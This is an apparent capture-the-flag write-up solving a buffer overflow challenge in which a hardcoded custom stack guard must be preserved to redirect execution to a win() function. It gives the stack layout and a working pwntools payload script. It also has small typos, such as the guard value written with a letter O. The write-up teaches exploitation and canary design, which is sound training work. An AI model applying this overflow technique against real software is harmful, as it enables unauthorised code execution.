# Solution - Canary Bypass Buffer Overflow

## Overview

This is a **ret2win** buffer overflow with a custom stack guard (canary) variable that must be preserved while overflowing to the return address.

**Flag:** `SGTECHCTF{c4n4ry_byp4ss_pr0}`

---

## The Twist
The `greet()` function has a `volatile unsigned long guard` iniitalized to `0xDEADBEEFDEADC0DE`. After reading input with `gets()`, the program checks if the guard has been modified. If it has, `exit(1)` is called **before** the function returns - meaning a naive overflow that corrupts the guard will never reach the `ret` instruction.

`checksec` reports "No canary found" because `-fno-stack-protector` was used at compile time. But the developer implemented a custom application-level guard that behaves like a canary.

---

## Exploitation Steps

### 1. Check protections

```bash
checksec --file-./vuln
```

Output shows no PIE, no canary, NX disabled

### 2. Read the source / reverse the binary

The guard value `0xDEADBEEFDEADCODE` is visible:
- In the source code (`#define GUARD_VALUE`)
- In the disassembly (`objdump -d vuln | grep movabs`)

### 3. Determine the stack layout

```
+---------------------------+  (higher addresses)
| return address  (8 bytes) |  offset 80
+---------------------------+
| saved RBP       (8 bytes) |  offset 72
+---------------------------+
| guard           (8 bytes) |  offset 64 <- MUST equal 0xDEADBEEFDEADCODE
+---------------------------+
| name[64]       (64 bytes)|   offset 0 <- our input starts here
+---------------------------+  (lower addresses)
```

### 4. Construct the payload

```python
from pwn import *

elf = ELF('./vuln')
win_addr = elf.symbols['win']
GUARD = 0xDEADBEEFDEADC0DE

payload = b'A' * 64         # Fill buffer
payload += p64(GUARD)       # Preserve the gaurd (bypass check)
payload += b'B' * 8         # Overwrite saved RBP (any value )
payload += p64(win_addr)    # Overwrite return address -> win()
print(payload)
```

**Total payload: 88 bytes.**

### 5. Send it

```bash
python3 solve.py                # local
python3 solve.py remote         # remote (with binary for address resolution)
```

---

# Why It Works
- `gets()` has no bounds check, which allows writing past the 64-byte buffer
- Guard value is a hardcoded constant, which can be found via static analysis and replayed
- There is no PIE, so the `win()` address is fixed and predictable
- There is no compiler canary, meaning that the custom guard is the only check

---

## Key Insight
A stack canary is only as strong as its secrecy. A real compiler canary is a random value generated at process startup (and often contains a null byte to prvent string-based leaks). This challenge's canary is a hardcoded constant which can be discovered by reversing.